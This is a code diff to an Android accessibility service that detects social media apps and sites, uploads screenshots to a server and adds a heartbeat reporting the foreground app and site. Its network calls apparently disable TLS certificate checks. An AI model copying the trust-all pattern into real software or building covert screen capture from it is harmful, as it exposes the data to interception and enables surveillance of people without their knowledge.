@@ -31,6 +31,7 @@ class ScreenMonitorService : AccessibilityService() {
     private var lastBitmapHash = 0
     @Volatile private var currentPackageName = ""
     @Volatile private var currentUrl = ""
+    @Volatile private var lastUploadCode = -1
 
     companion object {
         private val SOCIAL_APP_PACKAGES = setOf(
@@ -203,33 +204,86 @@ class ScreenMonitorService : AccessibilityService() {
         val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
         val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
 
-        if (!powerManager.isInteractive || keyguardManager.isKeyguardLocked) return
+        val screenOn = powerManager.isInteractive && !keyguardManager.isKeyguardLocked
+
+        val serverIp = getSharedPrefsValue("server_ip")
+        val deviceId = getSharedPrefsValue("device_id")
+        val deviceToken = getSharedPrefsValue("device_token")
+        if (serverIp == null || deviceId == null || deviceToken == null) return
 
         val pkg = currentPackageName
         val inSocialApp = isSocialApp(pkg)
-        val inSocialSite = BROWSER_PACKAGES.contains(pkg) && isSocialUrl(currentUrl)
-        if (!inSocialApp && !inSocialSite) return
+        val matchedSite = if (BROWSER_PACKAGES.contains(pkg)) matchedSocialDomain(currentUrl) else null
+        val inSocial = screenOn && (inSocialApp || matchedSite != null)
 
-        val serverIp = getSharedPrefsValue("server_ip") ?: return
-        val deviceId = getSharedPrefsValue("device_id") ?: return
-        val deviceToken = getSharedPrefsValue("device_token") ?: return
+        var enabled = false
+        var shotTaken = false
+        var uploadCode = -1
 
+        if (inSocial) {
+            try {
+                installTrustAllOnce()
+                val statusUrl = URL("https://$serverIp:3000/api/monitoring_status/$deviceId")
+                val conn = statusUrl.openConnection() as HttpsURLConnection
+                conn.requestMethod = "GET"
+                conn.connectTimeout = 5000
+                conn.readTimeout = 5000
+                conn.setRequestProperty("X-Device-Token", deviceToken)
+                if (conn.responseCode == 200) {
+                    val response = conn.inputStream.bufferedReader().use { it.readText() }
+                    enabled = JSONObject(response).optBoolean("monitoring_enabled", true)
+                    if (enabled) {
+                        shotTaken = true
+                        takeScreenshotAndUpload(serverIp, deviceId, deviceToken)
+                        uploadCode = lastUploadCode
+                    }
+                } else {
+                    uploadCode = conn.responseCode
+                }
+                conn.disconnect()
+            } catch (e: Exception) {
+                Log.e("ScreenMonitor", "Monitoring status check failed", e)
+            }
+        }
+
+        sendHeartbeat(serverIp, deviceId, deviceToken, pkg, matchedSite, screenOn, enabled, shotTaken, uploadCode)
+    }
+
+    private fun matchedSocialDomain(url: String): String? {
+        if (url.isEmpty()) return null
+        val lower = url.lowercase()
+        return SOCIAL_DOMAINS.firstOrNull { lower.contains(it) }
+    }
+
+    private fun sendHeartbeat(
+        serverIp: String, deviceId: String, deviceToken: String,
+        pkg: String, site: String?, screenOn: Boolean,
+        enabled: Boolean, shotTaken: Boolean, uploadCode: Int
+    ) {
         try {
             installTrustAllOnce()
-            val statusUrl = URL("https://$serverIp:3000/api/monitoring_status/$deviceId")
-            val conn = statusUrl.openConnection() as HttpsURLConnection
-            conn.requestMethod = "GET"
+            val url = URL("https://$serverIp:3000/api/monitor_heartbeat")
+            val conn = url.openConnection() as HttpsURLConnection
+            conn.requestMethod = "POST"
             conn.connectTimeout = 5000
             conn.readTimeout = 5000
+            conn.setRequestProperty("Content-Type", "application/json")
             conn.setRequestProperty("X-Device-Token", deviceToken)
-            if (conn.responseCode == 200) {
-                val response = conn.inputStream.bufferedReader().use { it.readText() }
-                val enabled = JSONObject(response).optBoolean("monitoring_enabled", true)
-                if (enabled) takeScreenshotAndUpload(serverIp, deviceId, deviceToken)
-            }
+            conn.doOutput = true
+            val payload = JSONObject()
+            payload.put("device_id", deviceId)
+            payload.put("pkg", pkg)
+            payload.put("host", site ?: "")
+            payload.put("screen_on", screenOn)
+            payload.put("shot_taken", shotTaken)
+            payload.put("upload_code", uploadCode)
+            conn.outputStream.write(payload.toString().toByteArray())
+            conn.outputStream.flush()
+            conn.outputStream.close()
+            conn.responseCode
             conn.disconnect()
         } catch (e: Exception) {
-            Log.e("ScreenMonitor", "Monitoring status check failed", e)
+            Log.e("ScreenMonitor", "Heartbeat failed", e)
         }
     }
 
@@ -300,9 +354,11 @@ class ScreenMonitorService : AccessibilityService() {
             conn.outputStream.flush()
             conn.outputStream.close()
 
+            lastUploadCode = conn.responseCode
             Log.d("ScreenMonitor", "Upload response: ${conn.responseCode}")
             conn.disconnect()
         } catch (e: Exception) {
+            lastUploadCode = -2
             Log.e("ScreenMonitor", "Upload failed", e)
         }
     }
